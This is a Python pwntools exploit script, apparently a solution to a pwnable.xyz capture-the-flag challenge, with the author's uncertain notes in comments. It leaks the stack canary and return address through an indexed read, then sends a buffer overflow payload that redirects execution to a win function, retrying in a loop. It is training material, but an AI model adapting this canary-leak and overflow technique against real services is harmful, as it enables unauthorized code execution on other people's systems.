# do i need a leak for this??
# not actually sure 

from pwn import *

""" r = process('./challenge') """

def solve():
    r = remote('svc.pwnable.xyz' , 30017)

    # scanf does not stop at null terminator 
    # we can clobber the stack clearly 
    # what is the point of calling getchar() again??
    # I have a stack smash but idk how to use it 
    # okay, never mind the scanf writes a null byte 
    # idea is to leak out the canary and the rip 
    # then scanf to write the canary and win function, send 0 and get flag 
    dummy = b'A' * 0x20 # one more for the null byte which we need to overwrite
    r.sendlineafter(": ", dummy)
    """ r.send("B") """

    # call get choice
    # math: +0x58 - 1, write to this position
    # 0x58 + 0x12 = 0x6a
    # 0x6a + 0x30 = 0x9a

    # read 0x58 -> 0x60

    def leak_rip():
        leak = ''
        for i in range(0x8, 0x8+0x6):
            pos = i + 0x12 + 0x30
            """ print("pos: ", pos) """
            r.sendafter("> ", pos.to_bytes(1, byteorder='little'))
            r.send(pos.to_bytes(1, byteorder='little'))
            l = r.recvline()
            """ print(l) """
            l = l.split(b': ')[1].split(b' ')[0].decode()
            leak = hex(int(l))[2:] + leak
        return leak 


    def leak_canary():
        # yea the canary is always the same 
        
        leak = ''
        for i in range(0x7, 0, -1):
            pos = i + 0x12 + 0x30 - 0x8
                # 0x48 is canary 
            r.sendafter("> ", pos.to_bytes(1, byteorder='little'))
            r.send(pos.to_bytes(1, byteorder='little'))
            l = r.recvline()
            """ print(l) """
            l = l.split(b': ')[1].split(b' ')[0].decode()
            leak = leak + hex(int(l))[2:]
        return leak + '00'


    # get leak for the canary
    # get the exploit afterwards

    leak = leak_rip()
    print(leak)
    can = leak_canary()
    print(can)
    win = int(leak, 16) - 0xb30 + 0xaac
    print("win: ", hex(win))
    bad_char = (win >> 0x8) % 0x100 
    print(hex(bad_char))
    if bad_char == 0x0b or bad_char == 0x0a:
        print("Bad character in win")
        r.close()
        return

    """ gdb.attach(r) """
    """ time.sleep(1) """
    #ret_gadget = int(leak, 16) - 0xb30 + 0x816

    """"""
    payload = b'B' * 0x28
    payload += p64(int(can, 16))
    payload += b'A' * 0x8
    payload += p64(win)

    """ payload += b'C' * 0x8 """
    print(len(payload))
    r.sendlineafter("> ", b"1")

    r.sendlineafter(": ", payload)
    r.sendlineafter("> ", b"0")
    r.interactive()

for i in range(1000):
    try:
        solve()
    except:
        continue
